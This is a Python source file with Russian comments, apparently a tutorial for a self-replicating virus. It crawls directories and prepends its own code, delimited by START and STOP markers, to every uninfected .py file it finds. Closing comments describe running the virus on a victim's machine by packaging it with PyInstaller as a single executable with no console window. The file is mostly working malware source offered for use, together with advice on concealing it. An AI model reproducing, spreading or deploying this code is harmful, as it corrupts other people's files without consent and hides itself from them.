import sys
import os

def code(void):
    print("Infected")
code(None)

def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        # Если нашли файл, проверяем его расширение
        if os.path.isfile(path):
            # Если расширение — py, вызываем virus
            if (os.path.splitext(path)[1] == ".py"):
                virus(path)
            else:
                pass
        else:
            # Если это каталог, заходим в него
            walk(path)
        
# START #
def virus(python):
    begin = "# START #\n"
    end = "# STOP #\n"
    # Читаем атакуемый файл, назовем его copy
    with open(sys.argv[0], "r") as copy:
        # Создаем флаг
        k = 0
        # Создаем переменную для кода вируса и добавляем пустую строку
        virus_code = "\n"
        # Построчно проходим заражаемый файл
        for line in copy:
            # Если находим маркер начала, поднимаем флаг
            if line == begin:
                k = 1
                # Добавляем маркер в зараженный код
                virus_code += begin
            # Если мы прошли начало, но не дошли до конца, копируем строку
            elif k == 1 and line != end:
                virus_code += line
            # Если дошли до конца, добавляем финальный маркер и выходим из цикла
            elif line == end:
                virus_code += end
                break
            else:
                pass
    # Снова читаем заражаемый файл
    with open(python, "r") as file:
        # Создаем переменную для исходного кода
        original_code = ""
        # Построчно копируем заражаемый код
        for line in file:
            original_code += line
            # Если находим маркер начала вируса, останавливаемся и поднимаем флаг vir
            if line == begin:
                vir = True
                break
            # Если маркера нет, опускаем флаг vir
            else:
                vir = False
    # Если флаг vir опущен, пишем в файл вирус и исходный код
    if not vir:
        with open(python, "w") as paste:
            paste.write(virus_code + "\n\n" + original_code)
    else:
        pass
# STOP #



# Делаем исполняемый файл
#Как запустить вирус, написанный на скриптовом языке, на машине жертвы? Есть два пути: либо как-то убедиться, что там установлен интерпретатор, либо запаковать наше творение вместе со всем необходимым в единый исполняемый файл. Этой цели служит утилита PyInstaller. Вот как ей пользоваться.

#Устанавливаем

#pip install PyInstaller
#И вводим команду

#PyInstaller "имя_файла.py" --onefile --noconsole
#Немного ждем, и у нас в папке с программой появляется куча файлов. Можешь смело избавляться от всего, кроме экзешников, они будет лежать в папке dist.